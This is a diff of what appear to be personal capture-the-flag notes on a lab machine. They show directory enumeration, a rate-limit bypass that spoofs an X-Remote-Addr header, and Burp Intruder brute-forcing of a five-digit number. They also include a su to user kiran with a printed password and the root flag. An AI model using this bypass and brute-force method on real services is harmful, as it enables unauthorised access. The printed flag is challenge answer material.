@@ -138,13 +138,11 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 http://10.10.26.36:8085/home                 (Status: 200) [Size: 955]
 http://10.10.26.36:8085/ping                 (Status: 200) [Size: 4]
 
-
 https://book.hacktricks.xyz/pentesting-web/rate-limit-bypass
 
 X-Remote-Addr: 127.0.0.1
 
 hint 5 numbers ***** so 10000 to 99999 using burp intruder
-
 
 POST /home HTTP/1.1
 
@@ -170,10 +168,7 @@ Referer: http://10.10.26.36:8085/home
 
 Upgrade-Insecure-Requests: 1
 
-
-
 number=10000
-
 
 HTTP/1.1 429 TOO MANY REQUESTS
 
@@ -195,10 +190,7 @@ X-RateLimit-Reset: 1688487743
 
 Retry-After: 3
 
-
-
 {"error":"rate limit execeeded"}
-
 
 POST /home HTTP/1.1
 
@@ -225,8 +217,6 @@ Referer: http://10.10.26.36:8085/home
 Upgrade-Insecure-Requests: 1
 
 X-Remote-Addr: 127.0.0.1
-
-
 
 number=§10000§
 
@@ -357,7 +347,6 @@ www-data@ubuntu-xenial:/var/backups$ su kiran
 su kiran
 Password: trythispasswordforuserkiran
 
-
 kiran@ubuntu-xenial:/var/backups$ cd /home/kiran
 cd /home/kiran
 kiran@ubuntu-xenial:~$ ls
@@ -403,11 +392,7 @@ root.txt
 cat root.txt
 afbb1696a893f35984163021d03f6095
 
-
 ```
-
-![[Pasted image 20230704113031.png]]
-![[Pasted image 20230704114523.png]]
 
 What is the number that revealed the path?
 
